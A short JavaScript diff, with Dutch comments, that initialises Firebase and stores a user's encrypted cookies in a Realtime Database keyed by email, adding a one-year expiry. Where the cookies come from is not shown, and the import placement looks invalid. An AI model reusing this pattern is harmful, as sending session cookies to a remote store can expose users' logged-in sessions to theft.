@@ -167,6 +167,12 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
+// Importeer Firebase
+import firebase from 'firebase/app';
+
+// Initialiseer Firebase
+firebase.initializeApp(firebaseConfig);
+
 // Haal de huidige gebruiker op
 var user = firebase.auth().currentUser;
 
@@ -185,7 +191,8 @@ var encryptedCookies = encrypt(cookies);
 
 // Sla de cookies op in de database
 firebase.database().ref('cookies').child(user.email).set({
-    cookies: encryptedCookies
+    cookies: encryptedCookies,
+    expires: new Date(Date.now() + (31557600000))
 });
 
 // Haal de cookies op uit de database
